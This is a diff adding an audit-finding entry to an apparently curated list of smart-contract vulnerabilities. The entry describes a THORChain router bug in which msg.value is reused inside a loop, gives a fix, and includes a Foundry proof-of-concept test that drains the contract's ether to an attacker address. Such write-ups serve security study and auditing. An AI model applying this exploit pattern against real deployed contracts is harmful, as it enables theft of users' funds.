@@ -535,3 +535,56 @@ function claimLicensePublic(uint256 amount, uint256 tier, string memory referral
 ```
 
 </details>
+
+## 15. [Medium] Due to the use of msg.value in for loop, anyone can drain all the funds from the THORChain_Router contract
+
+### msg.value in for loop
+
+- Summary: In the thorChain's Router contract, an attacker could drain all the contract's funds by exploiting the use of msg.value in a loop within the batchTransferOutAndCallV5() function. This occurs because the function sends the full msg.value repeatedly without proper checks, enabling a malicious user to direct these funds to an address they control.
+
+- Impact & Recommendation: It's recommended to replace msg.value with a specific etherAmount parameter, ensuring that the cumulative value does not exceed the total sent, preventing the contract from being drained or causing transaction reversion errors.
+
+<br> 🐬: [Source](https://code4rena.com/reports/2024-06-thorchain#m-02-Due-to-the-use-of-msg.value-in-for-loop,-anyone-can-drain-all-the-funds-from-the-THORChain_Router-contract) & [Report](https://code4rena.com/reports/2024-06-thorchain)
+
+<details><summary>POC</summary>
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+import {Test, console} from "forge-std/Test.sol";
+import {THORChain_Router} from "../contracts/THORChain_Router.sol";
+contract RouterTest is Test {
+    THORChain_Router public router;
+    address alice = makeAddr("alice");
+    function setUp() public {
+        router = new THORChain_Router();
+    }
+    function testRouterDrain() public {
+        deal(address(router), 100e18);
+        deal(alice, 10e18);
+        console.log("alice's balance before: ", alice.balance);
+        console.log("router's balance before:", address(router).balance);
+        THORChain_Router.TransferOutAndCallData[] memory cdArray = new THORChain_Router.TransferOutAndCallData[](11);
+        for(uint i; i < 11; i++) {
+            cdArray[i] = THORChain_Router.TransferOutAndCallData(
+                payable(alice),
+                address(0),
+                10e18,
+                address(0),
+                alice,
+                0,
+                "",
+                "",
+                ""
+            );
+        }
+        vm.prank(alice);
+        router.batchTransferOutAndCallV5{value: 10e18}(cdArray);
+        console.log("alice's balance after:  ", alice.balance);
+        console.log("router's balance after: ", address(router).balance);
+    }
+}
+
+```
+
+</details>
